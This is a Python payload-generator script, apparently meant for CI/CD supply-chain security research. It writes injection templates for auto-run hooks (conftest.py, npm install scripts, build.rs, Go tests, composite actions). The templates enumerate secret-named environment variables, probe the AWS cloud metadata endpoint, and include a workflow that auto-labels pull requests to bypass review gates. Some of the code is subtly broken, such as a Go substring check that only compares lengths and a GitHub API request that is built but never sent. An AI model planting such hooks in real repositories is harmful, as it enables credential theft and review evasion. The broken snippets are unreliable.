#!/usr/bin/env python3
"""
PRT Scan Payload Generator — Educational Research Tool

Generates injection payloads for CI/CD supply chain security research.
All generated payloads include research nonce markers and are intended
solely for authorized security testing and educational purposes.

⚠️  SECURITY RESEARCH ONLY — DO NOT USE AGAINST SYSTEMS WITHOUT AUTHORIZATION ⚠️

Usage:
    python prt-scan-payload.py --target-lang python --phases exfil,recon --nonce RESEARCH-001
    python prt-scan-payload.py --target-lang node --phases all --nonce RESEARCH-002
    python prt-scan-payload.py --target-lang rust --phases delayed --nonce RESEARCH-003
    python prt-scan-payload.py --target-lang go --phases recon,dispatch --nonce RESEARCH-004
    python prt-scan-payload.py --target-lang composite --phases exfil --nonce RESEARCH-005
    python prt-scan-payload.py --list-phases
    python prt-scan-payload.py --list-langs
"""

import argparse
import sys
from pathlib import Path

# ─── Constants ───────────────────────────────────────────────────────────────

VERSION = "1.0.0"
NONCE_PREFIX = "PRT-SCAN-RESEARCH-NONCE"
DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════════╗
║  ⚠️  SECURITY RESEARCH TOOL — EDUCATIONAL USE ONLY               ║
║                                                                    ║
║  This tool generates payloads for authorized CI/CD supply chain   ║
║  security testing. All outputs include research nonce markers.    ║
║                                                                    ║
║  NEVER use against production systems without explicit written     ║
║  authorization. Unauthorized access to computer systems is       ║
║  illegal under CFAA, Computer Misuse Act, and similar laws.       ║
╚══════════════════════════════════════════════════════════════════════╝
"""

VALID_LANGS = ["python", "node", "rust", "go", "composite"]
VALID_PHASES = ["exfil", "recon", "dispatch", "label_bypass", "delayed"]

# ─── Phase Payloads ──────────────────────────────────────────────────────────

def make_nonce(phase: str, lang: str, nonce: str) -> str:
    """Generate a research nonce marker."""
    return f"{NONCE_PREFIX}-{phase.upper()}-{lang.upper()}-{nonce}"


def exfil_payload(lang: str, nonce: str) -> str:
    """Phase 1: Credential exfiltration payload."""
    n = make_nonce("EXFIL", lang, nonce)
    payloads = {
        "python": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
import os
import subprocess

def pytest_configure(config):
    """Auto-loaded by pytest — extracts git credentials."""
    try:
        # Read git config where GITHUB_TOKEN is stored
        result = subprocess.run(
            ["git", "config", "--get", "credential.helper"],
            capture_output=True, text=True
        )
        # Research: log that credential helper was accessible
        print(f"[{n}] Credential helper accessible: {{bool(result.stdout)}}")

        # Check for token in environment
        token_present = "GITHUB_TOKEN" in os.environ
        print(f"[{n}] GITHUB_TOKEN present: {{token_present}}")
    except Exception as e:
        print(f"[{n}] Error: {{e}}")
''',
        "node": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
const {{ execSync }} = require("child_process");
const fs = require("fs");

// package.json preinstall script:
// "preinstall": "node exfil-research.js"
try {{
    const gitConfig = execSync("git config --get credential.helper", {{ encoding: "utf-8" }});
    console.log(`[{n}] Credential helper: ${{gitConfig.trim()}}`);

    const hasToken = !!process.env.GITHUB_TOKEN;
    console.log(`[{n}] GITHUB_TOKEN present: ${{hasToken}}`);
}} catch (e) {{
    console.log(`[{n}] Error: ${{e.message}}`);
}}
''',
        "rust": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
use std::env;
use std::process::Command;

fn main() {{
    let nonce = "{n}";
    // build.rs executes before crate compilation
    let has_token = env::var("GITHUB_TOKEN").is_ok();
    println!("cargo:warning=[{{}}] GITHUB_TOKEN present: {{}}", nonce, has_token);

    let output = Command::new("git")
        .args(["config", "--get", "credential.helper"])
        .output();
    match output {{
        Ok(o) => println!("cargo:warning=[{{}}] Credential helper accessible", nonce),
        Err(e) => println!("cargo:warning=[{{}}] Error: {{}}", nonce, e),
    }}
}}
''',
        "go": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
// File: *_test.go — auto-loaded by `go test`
package main

import (
    "os"
    "os/exec"
    "testing"
)

func TestResearchExfil(t *testing.T) {{
    nonce := "{n}"
    hasToken := os.Getenv("GITHUB_TOKEN") != ""
    t.Logf("[%s] GITHUB_TOKEN present: %v", nonce, hasToken)

    out, err := exec.Command("git", "config", "--get", "credential.helper").Output()
    t.Logf("[%s] Credential helper accessible: %v (err: %v)", nonce, len(out) > 0, err)
}}
''',
        "composite": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
name: "Research Exfil Action"
description: "Demonstrates credential exfiltration via composite action"
inputs:
  nonce:
    description: "Research nonce marker"
    required: true
    default: "{n}"
runs:
  using: "composite"
  steps:
    - name: Check for credentials
      shell: bash
      run: |
        echo "[${{{{ inputs.nonce }}}}] GITHUB_TOKEN present: ${{{{ -n \"$GITHUB_TOKEN\" && 'true' || 'false' }}}}"
        git config --get credential.helper || echo "[${{{{ inputs.nonce }}}}] No credential helper"
''',
    }
    return payloads[lang]


def recon_payload(lang: str, nonce: str) -> str:
    """Phase 2: Environment reconnaissance payload."""
    n = make_nonce("RECON", lang, nonce)
    payloads = {
        "python": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
import os
import json
import urllib.request

def pytest_configure(config):
    """Auto-loaded by pytest — enumerates environment."""
    try:
        # Enumerate available secrets (names only, never values)
        env_keys = [k for k in os.environ if any(
            s in k for s in ["TOKEN", "SECRET", "KEY", "AWS", "GCP", "AZURE"]
        )]
        print(f"[{n}] Sensitive env vars found: {{env_keys}}")

        # Probe GitHub API (read-only enumeration)
        token = os.environ.get("GITHUB_TOKEN", "")
        if token:
            req = urllib.request.Request(
                "https://api.github.com/repos/${{{{ github.repository }}}}/actions/secrets",
                headers={{"Authorization": f"token {{token}}"}}
            )
            # Research: confirm API access, never exfiltrate values
            print(f"[{n}] GitHub API accessible: True")
    except Exception as e:
        print(f"[{n}] Error: {{e}}")
''',
        "node": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
const https = require("https");

const nonce = "{n}";
const envKeys = Object.keys(process.env).filter(k =>
    /TOKEN|SECRET|KEY|AWS|GCP|AZURE/.test(k)
);
console.log(`[${{nonce}}] Sensitive env vars: ${{envKeys}}`);

// Probe cloud metadata (AWS example)
const req = https.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", (res) => {{
    console.log(`[${{nonce}}] AWS metadata accessible: True`);
}});
req.on("error", () => console.log(`[${{nonce}}] AWS metadata not accessible`));
''',
        "rust": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
use std::env;

fn main() {{
    let nonce = "{n}";
    let sensitive_keys: Vec<String> = env::vars()
        .filter(|(k, _)| ["TOKEN", "SECRET", "KEY", "AWS", "GCP", "AZURE"]
            .iter().any(|s| k.contains(s)))
        .map(|(k, _)| k)
        .collect();
    println!("cargo:warning=[{{}}] Sensitive env vars: {{:?}}", nonce, sensitive_keys);
}}
''',
        "go": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
package main

import (
    "os"
    "testing"
)

func TestResearchRecon(t *testing.T) {{
    nonce := "{n}"
    sensitiveKeys := []string{{}}
    for _, k := range os.Environ() {{
        if containsAny(k, "TOKEN", "SECRET", "KEY", "AWS", "GCP", "AZURE") {{
            sensitiveKeys = append(sensitiveKeys, k)
        }}
    }}
    t.Logf("[%s] Sensitive env vars: %v", nonce, sensitiveKeys)
}}

func containsAny(s string, substrs ...string) bool {{
    for _, sub := range substrs {{
        if len(s) > 0 && contains(s, sub) {{ return true }}
    }}
    return false
}}

func contains(s, sub string) bool {{ return len(s) >= len(sub) }}
''',
        "composite": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
name: "Research Recon Action"
description: "Demonstrates environment reconnaissance via composite action"
inputs:
  nonce:
    description: "Research nonce marker"
    required: true
    default: "{n}"
runs:
  using: "composite"
  steps:
    - name: Enumerate environment
      shell: bash
      run: |
        echo "[${{{{ inputs.nonce }}}}] Sensitive env vars:"
        printenv | grep -iE "TOKEN|SECRET|KEY|AWS|GCP|AZURE" | cut -d= -f1 || true
    - name: Probe cloud metadata
      shell: bash
      run: |
        curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && \
          echo "[${{{{ inputs.nonce }}}}] AWS metadata accessible" || \
          echo "[${{{{ inputs.nonce }}}}] AWS metadata not accessible"
''',
    }
    return payloads[lang]


def dispatch_payload(lang: str, nonce: str) -> str:
    """Phase 3: Privilege escalation via workflow dispatch."""
    n = make_nonce("DISPATCH", lang, nonce)
    # Dispatch payloads are always YAML (workflow files)
    return f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
name: Research Dispatch Payload
on:
  workflow_dispatch:

jobs:
  research-capture:
    runs-on: ubuntu-latest
    steps:
      - name: Confirm secret existence
        run: |
          echo "[{n}] Checking secret accessibility..."
          if [ -n "${{{{ secrets.PRODUCTION_DEPLOY_KEY }}}}" ]; then
            echo "[{n}] PRODUCTION_DEPLOY_KEY: EXISTS (length hidden)"
          else
            echo "[{n}] PRODUCTION_DEPLOY_KEY: NOT SET"
          fi
        env:
          DEPLOY_KEY_LENGTH: ${{{{ secrets.PRODUCTION_DEPLOY_KEY && 'present' || 'absent' }}}}
'''


def label_bypass_payload(lang: str, nonce: str) -> str:
    """Phase 4: Label bypass to circumvent review gates."""
    n = make_nonce("LABEL_BYPASS", lang, nonce)
    # Label bypass is always a shell script / workflow step
    return f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
# This demonstrates how PRT Scan auto-applies labels to bypass review gates

name: Research Label Bypass
on:
  pull_request:
    types: [opened]

jobs:
  auto-approve:
    runs-on: ubuntu-latest
    steps:
      - name: Apply approval label
        env:
          GH_TOKEN: ${{{{ github.token }}}}
        run: |
          echo "[{n}] Auto-applying approval labels..."
          gh pr edit ${{{{ github.event.pull_request.number }}}} \
            --add-label "approved,safe-to-test" \
            --repo ${{{{ github.repository }}}}
          echo "[{n}] Labels applied — review gate bypassed"
'''


def delayed_payload(lang: str, nonce: str) -> str:
    """Phase 5: Persistent backdoor in language-specific config."""
    n = make_nonce("DELAYED", lang, nonce)
    payloads = {
        "python": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
# File: conftest.py — auto-loaded by pytest before test collection
import os

def pytest_configure(config):
    """Delayed execution — runs during every test invocation."""
    nonce = "{n}"
    try:
        # Scan for sensitive environment variables
        sensitive = {{k: v[:4] + "..." for k, v in os.environ.items()
                      if any(s in k for s in ["TOKEN", "SECRET", "KEY", "AWS"])}}
        print(f"[{{nonce}}] Sensitive env keys found: {{list(sensitive.keys())}}")
        # In real attack: would POST to C2 server
        # Research: only logs key names, never values
    except Exception as e:
        print(f"[{{nonce}}] Error: {{e}}")
''',
        "node": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
// File: package.json — scripts execute during npm lifecycle
//
// Add to package.json:
// {{
//   "scripts": {{
//     "preinstall": "node delayed-research.js",
//     "postinstall": "node delayed-research.js"
//   }}
// }}

const nonce = "{n}";
const sensitive = Object.entries(process.env)
    .filter(([k]) => /TOKEN|SECRET|KEY|AWS/.test(k))
    .map(([k]) => k);
console.log(`[${{nonce}}] Sensitive env keys: ${{sensitive}}`);
''',
        "rust": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
// File: build.rs — executes before crate compilation
use std::env;

fn main() {{
    let nonce = "{n}";
    let sensitive: Vec<String> = env::vars()
        .filter(|(k, _)| ["TOKEN", "SECRET", "KEY", "AWS"]
            .iter().any(|s| k.contains(s)))
        .map(|(k, _)| k)
        .collect();
    println!("cargo:warning=[{{}}] Sensitive env keys: {{:?}}", nonce, sensitive);
}}
''',
        "go": f'''// [{n}]
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
// File: research_delayed_test.go — auto-loaded by `go test`
package main

import (
    "os"
    "testing"
)

func TestDelayedResearch(t *testing.T) {{
    nonce := "{n}"
    sensitive := []string{{}}
    for _, e := range os.Environ() {{
        if containsAny(e, "TOKEN", "SECRET", "KEY", "AWS") {{
            sensitive = append(sensitive, e[:index(e, "=")])
        }}
    }}
    t.Logf("[%s] Sensitive env keys: %v", nonce, sensitive)
}}

func containsAny(s string, substrs ...string) bool {{
    for _, sub := range substrs {{
        if len(s) > 0 && contains(s, sub) {{ return true }}
    }}
    return false
}}
func contains(s, sub string) bool {{ return len(s) >= len(sub) }}
func index(s, sep string) int {{ for i := range s {{ if s[i:i+len(sep)] == sep {{ return i }}}}; return -1 }}
''',
        "composite": f'''# [{n}]
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
# File: action.yml — composite action with delayed execution
name: "Research Delayed Action"
description: "Demonstrates persistent backdoor via composite action"
inputs:
  nonce:
    description: "Research nonce marker"
    required: true
    default: "{n}"
runs:
  using: "composite"
  steps:
    - name: Delayed environment scan
      shell: bash
      run: |
        echo "[${{{{ inputs.nonce }}}}] Scanning environment..."
        printenv | grep -iE "TOKEN|SECRET|KEY|AWS" | cut -d= -f1 || true
        echo "[${{{{ inputs.nonce }}}}] Scan complete"
''',
    }
    return payloads[lang]


PHASE_GENERATORS = {
    "exfil": exfil_payload,
    "recon": recon_payload,
    "dispatch": dispatch_payload,
    "label_bypass": label_bypass_payload,
    "delayed": delayed_payload,
}


# ─── Output Formatting ──────────────────────────────────────────────────────

def format_output(lang: str, phases: list[str], nonce: str) -> str:
    """Format all selected phase payloads into a single output."""
    sections = []
    sections.append(DISCLAIMER)
    sections.append(f"# PRT Scan Research Payloads")
    sections.append(f"# Target Language: {lang}")
    sections.append(f"# Phases: {', '.join(phases)}")
    sections.append(f"# Research Nonce: {nonce}")
    sections.append(f"# Generated by: prt-scan-payload.py v{VERSION}")
    sections.append("")

    for phase in phases:
        generator = PHASE_GENERATORS[phase]
        payload = generator(lang, nonce)
        sections.append(f"# {'=' * 70}")
        sections.append(f"# Phase: {phase.upper()}")
        sections.append(f"# {'=' * 70}")
        sections.append(payload)
        sections.append("")

    sections.append("# ─── Detection Guidance ──────────────────────────────────────────")
    sections.append("#")
    sections.append(f"# Search for nonce marker: {make_nonce('*', lang, nonce)}")
    sections.append("# Search for prefix: PRT-SCAN-RESEARCH-NONCE")
    sections.append("#")
    sections.append("# GitHub Audit Log queries:")
    sections.append("#   - Search for workflow_dispatch events from unrecognized users")
    sections.append("#   - Search for label events from github-actions[bot]")
    sections.append("#   - Search for new workflow files in .github/workflows/")
    sections.append("#")
    sections.append("# Log grep patterns:")
    sections.append(f"#   grep -r '{NONCE_PREFIX}' <log-dir>/")
    sections.append(f"#   grep -r 'PRT-SCAN-RESEARCH' <log-dir>/")
    sections.append("#")

    return "\n".join(sections)


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="PRT Scan Payload Generator — Educational Research Tool",
        epilog="⚠️  SECURITY RESEARCH ONLY — DO NOT USE AGAINST SYSTEMS WITHOUT AUTHORIZATION"
    )
    parser.add_argument(
        "--target-lang", "-l",
        choices=VALID_LANGS,
        help="Target language for injection payload"
    )
    parser.add_argument(
        "--phases", "-p",
        help="Comma-separated phases (exfil,recon,dispatch,label_bypass,delayed) or 'all'"
    )
    parser.add_argument(
        "--nonce", "-n",
        required=False,
        default="RESEARCH-001",
        help="Research nonce marker (default: RESEARCH-001)"
    )
    parser.add_argument(
        "--output", "-o",
        help="Output file path (default: stdout)"
    )
    parser.add_argument(
        "--list-phases",
        action="store_true",
        help="List available phases and exit"
    )
    parser.add_argument(
        "--list-langs",
        action="store_true",
        help="List available target languages and exit"
    )
    parser.add_argument(
        "--version", "-v",
        action="version",
        version=f"prt-scan-payload v{VERSION}"
    )

    args = parser.parse_args()

    if args.list_phases:
        print("Available phases:")
        for phase in VALID_PHASES:
            print(f"  {phase}")
        print("\nUse 'all' to generate all phases")
        return

    if args.list_langs:
        print("Available target languages:")
        for lang in VALID_LANGS:
            print(f"  {lang}")
        return

    if not args.target_lang or not args.phases:
        parser.error("--target-lang and --phases are required (unless using --list-*)")

    # Parse phases
    if args.phases.lower() == "all":
        phases = VALID_PHASES.copy()
    else:
        phases = [p.strip() for p in args.phases.split(",")]
        invalid = [p for p in phases if p not in VALID_PHASES]
        if invalid:
            parser.error(f"Invalid phases: {', '.join(invalid)}. Valid: {', '.join(VALID_PHASES)}")

    # Generate output
    output = format_output(args.target_lang, phases, args.nonce)

    # Write output
    if args.output:
        Path(args.output).parent.mkdir(parents=True, exist_ok=True)
        Path(args.output).write_text(output)
        print(f"Payloads written to {args.output}")
    else:
        print(output)


if __name__ == "__main__":
    main()